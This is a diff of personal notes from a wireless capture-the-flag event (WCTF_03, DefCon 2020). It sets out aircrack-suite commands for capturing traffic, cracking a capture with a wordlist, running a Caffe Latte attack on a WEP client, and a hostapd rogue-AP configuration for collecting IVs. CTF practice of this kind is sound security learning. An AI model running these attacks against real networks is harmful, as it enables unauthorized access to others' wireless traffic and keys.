@@ -9,6 +9,7 @@ sudo airmon-ng start wlan27
 sudo airodump-ng  -w derp --output-format pcap --band ag wlan27mon
 
 
+
 # wget https://raw.githubusercontent.com/rfhs/wctf-files/master/wordlist/cyberpunk.words
 sudo aircrack-ng -w cyberpunk.words derp0-01.cap
 
@@ -21,18 +22,41 @@ This signals a client-side attack
 
 
 Begin the Caffe Latte Attack by starting an airodump-ng capture and writing the keystream to an output file:
+It helps to know the channel, which is more of an art and needs tweaking by playing with airodump to find what the target is looking for.
 
-airodump-ng -w cafefile --band ag --essid WCTF_03 wlan29mon
-
+airodump-ng -w cafefile --output-format pcap --band a -c 44 wlan29mon
 
 While an airodump-ng capture is running, perform the Caffe-Latte Attack:
 
-aireplay-ng -6 -h 02:00:00:00:1e:00 -b 3A:FD:31:E0:81:F4 -D wlan30mon
+to specify the channel, the interface needs to be brought up in airodump with channel specified.
 
-    -6 means Cafe-Latte attack
+aireplay-ng --caffe-latte -h 02:00:00:00:1E:00 -b 00:13:10:30:24:9C -D wlan30mon
+
     -h is our card MAC address
-    -b is the victim AP
+    -b is the Access Point MAC (any valid MAC should work)
     -D disables AP detection.
 
 find our own mac with `iw dev`
 
+
+^ This didn't work for me at DefCon 2020
+
+According to another member used hostapd instead of aireplay
+
+```
+interface=wlan31mon
+ssid=WCTF_03
+channel=44
+hw_mode=a
+#mana_wpaout=hostapd.hccapx
+wep_default_key=1
+wep_key1="abcde"
+wep_key_len_broadcast="5"
+wep_key_len_unicast="5"
+wep_rekey_period=300
+auth_algs=3
+```
+
+put that into my_ha.conf
+
+hostapd my_ha.conf starts the beacon and the original airodump will capture enough IVs for aircrack
